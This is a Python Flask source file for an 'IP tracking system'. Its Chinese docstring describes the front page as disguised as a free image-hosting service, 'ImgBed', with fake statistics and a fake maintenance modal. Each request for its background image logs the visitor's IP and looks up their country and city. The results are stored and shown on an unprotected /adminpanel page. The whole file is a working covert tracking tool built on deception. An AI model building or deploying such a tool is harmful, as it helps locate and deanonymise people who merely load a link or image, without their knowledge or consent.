"""
IP追踪系统 - 记录访问者IP并显示地理位置
"""
import os
import sqlite3
from flask import Flask, send_file, request, render_template_string
import requests
from datetime import datetime

app = Flask(__name__)

# 获取应用根目录（兼容各种部署环境）
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
# 数据库放到 /tmp（容器可写目录），本地开发放当前目录
DB_PATH = '/tmp/ip_records.db' if os.path.exists('/tmp') else os.path.join(BASE_DIR, 'ip_records.db')
# 图片使用绝对路径
IMG_PATH = os.path.join(BASE_DIR, 'background.png')


def init_db():
    """初始化数据库"""
    conn = sqlite3.connect(DB_PATH)
    conn.execute('''CREATE TABLE IF NOT EXISTS ip_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT NOT NULL,
        country TEXT,
        city TEXT,
        visit_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()

# 模块加载时初始化数据库（兼容 gunicorn）
init_db()

def get_ip_info(ip):
    """获取IP地理位置信息"""
    try:
        # 本地IP处理
        if ip in ('127.0.0.1', 'localhost', '::1'):
            return {'country': '本地', 'city': 'localhost'}
        resp = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
        data = resp.json()
        return {'country': data.get('country', '未知'), 'city': data.get('city', '未知')}
    except:
        return {'country': '未知', 'city': '未知'}

def log_ip(ip):
    """记录IP到数据库"""
    info = get_ip_info(ip)
    conn = sqlite3.connect(DB_PATH)
    conn.execute('INSERT INTO ip_logs (ip, country, city) VALUES (?, ?, ?)',
                 (ip, info['country'], info['city']))
    conn.commit()
    conn.close()

@app.route('/')
def index():
    """首页 - 伪装成图床"""
    return render_template_string(INDEX_HTML)

@app.route('/background.png')
def background():
    """返回背景图片并记录IP"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()
    log_ip(ip)
    return send_file(IMG_PATH, mimetype='image/png')

@app.route('/adminpanel')
def admin_panel():
    """管理员面板 - 显示所有IP记录"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.execute('SELECT ip, country, city, visit_time FROM ip_logs ORDER BY visit_time DESC')
    records = cursor.fetchall()
    conn.close()

    # 统计数据
    total = len(records)
    countries = {}
    for r in records:
        countries[r[1]] = countries.get(r[1], 0) + 1

    return render_template_string(ADMIN_HTML, records=records, total=total, countries=countries)

INDEX_HTML = '''
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="ImgBed - 免费稳定的图片托管服务，支持外链分享，永久存储">
    <meta name="keywords" content="图床,免费图床,图片托管,图片外链">
    <title>ImgBed - 免费图床 | 稳定快速的图片托管服务</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🖼️</text></svg>">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif; background: #f5f7fa; color: #333; line-height: 1.6; }

        /* 导航栏 */
        .navbar { background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.08); position: fixed; top: 0; left: 0; right: 0; z-index: 100; }
        .nav-container { max-width: 1200px; margin: 0 auto; padding: 0 20px; display: flex; justify-content: space-between; align-items: center; height: 64px; }
        .logo { display: flex; align-items: center; gap: 10px; font-size: 22px; font-weight: 700; color: #2563eb; text-decoration: none; }
        .logo-icon { font-size: 28px; }
        .nav-links { display: flex; gap: 32px; }
        .nav-links a { color: #64748b; text-decoration: none; font-size: 15px; transition: color 0.2s; }
        .nav-links a:hover { color: #2563eb; }
        .nav-right { display: flex; align-items: center; gap: 16px; }
        .btn-login { color: #2563eb; background: none; border: 1px solid #2563eb; padding: 8px 20px; border-radius: 6px; cursor: pointer; font-size: 14px; transition: all 0.2s; }
        .btn-login:hover { background: #2563eb; color: #fff; }

        /* 主区域 */
        .hero { padding: 120px 20px 60px; text-align: center; background: linear-gradient(180deg, #fff 0%, #f5f7fa 100%); }
        .hero h1 { font-size: 42px; font-weight: 700; color: #1e293b; margin-bottom: 16px; }
        .hero p { font-size: 18px; color: #64748b; max-width: 500px; margin: 0 auto 40px; }

        /* 上传区域 */
        .upload-section { max-width: 680px; margin: 0 auto; }
        .upload-box { background: #fff; border: 2px dashed #cbd5e1; border-radius: 16px; padding: 60px 40px; cursor: pointer; transition: all 0.3s; position: relative; }
        .upload-box:hover { border-color: #2563eb; background: #f8fafc; }
        .upload-box.dragover { border-color: #2563eb; background: #eff6ff; transform: scale(1.01); }
        .upload-icon { width: 64px; height: 64px; margin: 0 auto 20px; background: #eff6ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; }
        .upload-title { font-size: 18px; font-weight: 600; color: #1e293b; margin-bottom: 8px; }
        .upload-desc { color: #94a3b8; font-size: 14px; margin-bottom: 24px; }
        .upload-btn { background: #2563eb; color: #fff; border: none; padding: 12px 32px; border-radius: 8px; font-size: 15px; font-weight: 500; cursor: pointer; transition: all 0.2s; }
        .upload-btn:hover { background: #1d4ed8; transform: translateY(-1px); }
        .upload-hint { margin-top: 20px; font-size: 13px; color: #94a3b8; }
        .upload-hint span { margin: 0 8px; }

        /* 功能特性 */
        .features { padding: 80px 20px; max-width: 1000px; margin: 0 auto; }
        .features-title { text-align: center; font-size: 28px; font-weight: 600; color: #1e293b; margin-bottom: 48px; }
        .features-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 24px; }
        .feature-card { background: #fff; padding: 32px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.04); }
        .feature-icon { font-size: 36px; margin-bottom: 16px; }
        .feature-card h3 { font-size: 18px; font-weight: 600; color: #1e293b; margin-bottom: 8px; }
        .feature-card p { color: #64748b; font-size: 14px; }

        /* 统计数据 */
        .stats { background: #1e293b; padding: 60px 20px; }
        .stats-container { max-width: 800px; margin: 0 auto; display: flex; justify-content: space-around; text-align: center; flex-wrap: wrap; gap: 40px; }
        .stat-item h2 { font-size: 36px; font-weight: 700; color: #fff; margin-bottom: 8px; }
        .stat-item p { color: #94a3b8; font-size: 14px; }

        /* 页脚 */
        .footer { background: #fff; padding: 40px 20px; text-align: center; border-top: 1px solid #e2e8f0; }
        .footer-links { margin-bottom: 16px; }
        .footer-links a { color: #64748b; text-decoration: none; margin: 0 16px; font-size: 14px; }
        .footer-links a:hover { color: #2563eb; }
        .copyright { color: #94a3b8; font-size: 13px; }

        /* 弹窗 */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); align-items: center; justify-content: center; z-index: 200; backdrop-filter: blur(4px); }
        .modal.active { display: flex; }
        .modal-content { background: #fff; padding: 48px; border-radius: 16px; text-align: center; max-width: 400px; width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); animation: modalIn 0.3s; }
        @keyframes modalIn { from { opacity: 0; transform: scale(0.9) translateY(20px); } to { opacity: 1; transform: scale(1) translateY(0); } }
        .modal-icon { font-size: 48px; margin-bottom: 20px; }
        .modal-content h2 { font-size: 20px; color: #1e293b; margin-bottom: 12px; font-weight: 600; }
        .modal-content p { color: #64748b; margin-bottom: 24px; font-size: 15px; line-height: 1.6; }
        .modal-close { background: #f1f5f9; color: #475569; border: none; padding: 12px 32px; border-radius: 8px; cursor: pointer; font-size: 15px; font-weight: 500; transition: background 0.2s; }
        .modal-close:hover { background: #e2e8f0; }
        .maintenance-tag { display: inline-block; background: #fef3c7; color: #d97706; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 500; margin-bottom: 16px; }

        /* 隐藏的文件输入 */
        #fileInput { display: none; }

        /* 响应式 */
        @media (max-width: 768px) {
            .nav-links { display: none; }
            .hero h1 { font-size: 28px; }
            .hero p { font-size: 16px; }
            .upload-box { padding: 40px 24px; }
            .stats-container { flex-direction: column; gap: 24px; }
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="nav-container">
            <a href="/" class="logo"><span class="logo-icon">🖼️</span>ImgBed</a>
            <div class="nav-links">
                <a href="javascript:void(0)">首页</a>
                <a href="javascript:void(0)" onclick="showMaintenance()">我的图片</a>
                <a href="javascript:void(0)">API文档</a>
                <a href="javascript:void(0)">定价方案</a>
            </div>
            <div class="nav-right">
                <button class="btn-login" onclick="showMaintenance()">登录 / 注册</button>
            </div>
        </div>
    </nav>

    <section class="hero">
        <h1>简单好用的免费图床</h1>
        <p>上传即可获取外链，支持多种格式，全球CDN加速，永久免费存储</p>

        <div class="upload-section">
            <div class="upload-box" id="uploadBox" onclick="triggerUpload()">
                <div class="upload-icon">📤</div>
                <div class="upload-title">拖拽图片到这里，或点击上传</div>
                <div class="upload-desc">支持批量上传，单张最大 10MB</div>
                <button class="upload-btn" onclick="event.stopPropagation(); triggerUpload()">选择图片</button>
                <div class="upload-hint">
                    <span>JPG</span>•<span>PNG</span>•<span>GIF</span>•<span>WebP</span>•<span>BMP</span>
                </div>
            </div>
            <input type="file" id="fileInput" accept="image/*" multiple>
        </div>
    </section>

    <section class="features">
        <h2 class="features-title">为什么选择 ImgBed？</h2>
        <div class="features-grid">
            <div class="feature-card">
                <div class="feature-icon">⚡</div>
                <h3>极速上传</h3>
                <p>采用分块上传技术，大文件秒传，上传速度提升300%</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🌍</div>
                <h3>全球CDN</h3>
                <p>全球200+节点加速，无论访客在哪里都能快速加载</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🔒</div>
                <h3>安全可靠</h3>
                <p>SSL加密传输，多重备份存储，数据安全有保障</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🔗</div>
                <h3>多种外链</h3>
                <p>支持HTML、Markdown、BBCode等多种外链格式</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">💎</div>
                <h3>永久免费</h3>
                <p>基础功能永久免费，无水印无广告，良心服务</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🛠️</div>
                <h3>开发者友好</h3>
                <p>提供完善的API接口，轻松集成到您的应用中</p>
            </div>
        </div>
    </section>

    <section class="stats">
        <div class="stats-container">
            <div class="stat-item">
                <h2>1,280,000+</h2>
                <p>累计上传图片</p>
            </div>
            <div class="stat-item">
                <h2>56,000+</h2>
                <p>注册用户</p>
            </div>
            <div class="stat-item">
                <h2>99.9%</h2>
                <p>服务可用性</p>
            </div>
        </div>
    </section>

    <footer class="footer">
        <div class="footer-links">
            <a href="javascript:void(0)">关于我们</a>
            <a href="javascript:void(0)">使用条款</a>
            <a href="javascript:void(0)">隐私政策</a>
            <a href="javascript:void(0)">联系我们</a>
        </div>
        <p class="copyright">© 2024 ImgBed. All rights reserved. | 粤ICP备2024xxxxxx号</p>
    </footer>

    <div class="modal" id="modal">
        <div class="modal-content">
            <div class="modal-icon">🔧</div>
            <span class="maintenance-tag">系统升级中</span>
            <h2>服务暂时不可用</h2>
            <p>我们正在进行系统升级以提供更好的服务体验，预计2小时内恢复。感谢您的耐心等待！</p>
            <button class="modal-close" onclick="closeModal()">我知道了</button>
        </div>
    </div>

    <script>
        const uploadBox = document.getElementById('uploadBox');
        const fileInput = document.getElementById('fileInput');

        function triggerUpload() { showMaintenance(); }
        function showMaintenance() { document.getElementById('modal').classList.add('active'); }
        function closeModal() { document.getElementById('modal').classList.remove('active'); }

        // 点击背景关闭
        document.getElementById('modal').addEventListener('click', function(e) {
            if(e.target === this) closeModal();
        });

        // 拖拽效果
        uploadBox.addEventListener('dragover', function(e) {
            e.preventDefault();
            this.classList.add('dragover');
        });
        uploadBox.addEventListener('dragleave', function(e) {
            e.preventDefault();
            this.classList.remove('dragover');
        });
        uploadBox.addEventListener('drop', function(e) {
            e.preventDefault();
            this.classList.remove('dragover');
            showMaintenance();
        });

        // 文件选择
        fileInput.addEventListener('change', function() {
            if(this.files.length > 0) showMaintenance();
        });

        // ESC关闭弹窗
        document.addEventListener('keydown', function(e) {
            if(e.key === 'Escape') closeModal();
        });
    </script>
</body>
</html>
'''

ADMIN_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>IP追踪管理面板</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #e2e8f0; min-height: 100vh; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { font-size: 28px; margin-bottom: 20px; color: #38bdf8; }
        .stats { display: flex; gap: 20px; margin-bottom: 30px; flex-wrap: wrap; }
        .stat-card { background: #1e293b; padding: 20px; border-radius: 12px; min-width: 150px; }
        .stat-card h3 { color: #94a3b8; font-size: 14px; margin-bottom: 8px; }
        .stat-card .value { font-size: 32px; font-weight: bold; color: #38bdf8; }
        .country-list { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 10px; }
        .country-tag { background: #334155; padding: 4px 12px; border-radius: 20px; font-size: 13px; }
        table { width: 100%; border-collapse: collapse; background: #1e293b; border-radius: 12px; overflow: hidden; }
        th, td { padding: 14px 16px; text-align: left; }
        th { background: #334155; color: #94a3b8; font-weight: 500; font-size: 13px; text-transform: uppercase; }
        tr:hover { background: #334155; }
        td { border-bottom: 1px solid #334155; }
        .ip { font-family: monospace; color: #fbbf24; }
        .country { color: #4ade80; }
        .time { color: #94a3b8; font-size: 13px; }
        .empty { text-align: center; padding: 60px; color: #64748b; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📊 IP追踪管理面板</h1>
        <div class="stats">
            <div class="stat-card">
                <h3>总访问量</h3>
                <div class="value">{{ total }}</div>
            </div>
            <div class="stat-card">
                <h3>国家/地区分布</h3>
                <div class="country-list">
                    {% for country, count in countries.items() %}
                    <span class="country-tag">{{ country }}: {{ count }}</span>
                    {% endfor %}
                </div>
            </div>
        </div>
        <table>
            <thead>
                <tr><th>IP地址</th><th>国家</th><th>城市</th><th>访问时间</th></tr>
            </thead>
            <tbody>
                {% if records %}
                    {% for r in records %}
                    <tr>
                        <td class="ip">{{ r[0] }}</td>
                        <td class="country">{{ r[1] }}</td>
                        <td>{{ r[2] }}</td>
                        <td class="time">{{ r[3] }}</td>
                    </tr>
                    {% endfor %}
                {% else %}
                    <tr><td colspan="4" class="empty">暂无访问记录，等待第一个访客...</td></tr>
                {% endif %}
            </tbody>
        </table>
    </div>
</body>
</html>
'''

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
